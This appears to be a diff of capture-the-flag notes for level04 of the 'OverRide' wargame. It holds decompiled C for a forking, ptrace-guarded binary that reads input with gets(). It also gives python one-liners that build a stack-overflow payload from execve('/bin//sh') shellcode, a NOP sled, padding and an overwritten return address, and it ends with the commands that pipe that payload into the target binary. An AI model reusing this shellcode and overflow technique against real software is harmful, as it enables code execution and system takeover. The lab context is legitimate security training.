@@ -1,50 +1,47 @@
 
+#include  "sys/wait.h"
+
 int		main(void)
 
 {
   int iVar1;
   int *puVar2;
   byte bVar3;
-  uint local_a4;
-  int local_a0 [32];
-  uint local_20;
+  uint state;
+  int buff [32];
   uint local_1c;
   long local_18;
-  __pid_t local_14;
+  __pid_t pid;
   
   bVar3 = 0;
-  local_14 = fork();
-  puVar2 = local_a0;
-  for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {
-    *puVar2 = 0;
-    puVar2 = puVar2 + (uint)bVar3 * -2 + 1;
-  }
+  pid = fork();
+  memset(buff, 0, sizeof(buff));
+
   local_18 = 0;
-  local_a4 = 0;
-  if (local_14 == 0) {
+  state = 0;
+  if (pid == 0) {
     prctl(1, 1);
     ptrace(0, 0, 0, 0);
     puts("Give me some shellcode, k");
-    gets((char *)local_a0);
+    gets((char *)buff);
   }
   else {
     do {
-      wait(&local_a4);
-      local_20 = local_a4;
-      if (((local_a4 & 0x7f) == 0) ||
-         (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1)) {
+      wait(&state);
+      state;
+      if (((state & _WSTOPPED) == 0) || (((state & 0x7f) + 1) >> 1) > 0) {
         puts("child is exiting...");
         return 0;
       }
-      local_18 = ptrace(PTRACE_PEEKUSER,local_14,0x2c,0);
+      local_18 = ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
     } while (local_18 != 0xb);
     puts("no exec() for you");
-    kill(local_14,9);
+    kill(pid,9);
   }
   return 0;
 }
 python -c 'print  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+ "A"*112 + "\x00\x00\x00\x00" + "A"*12 + "BBBB" + "\xff\xff\xd6\x50"[::-1]'
-python -c 'print  "A"*28 + "A"*112 + "\x00"*4 + "A"*12 + "BBBB" + "\xff\xff\xd6\x50"[::-1]'
+python -c 'print  "A"*28 + "A"*112 + "\x00"*4 + "A"*12 + "BBBB" + "\x50\xd6\xff\xff"'
 
 
 char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";
@@ -52,3 +49,8 @@ char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3
 
 // size of shellcode is 28
 char shellcode[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+
+
+
+level04@OverRide:~$ python -c 'print "\x90"*112 +  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x00"*4 + "A"*12 + "\x80\xd6\xff\xff"' > /tmp/pyload
+level04@OverRide:~$ (cat /tmp/pyload ; cat ) | /home/users/level04/level04
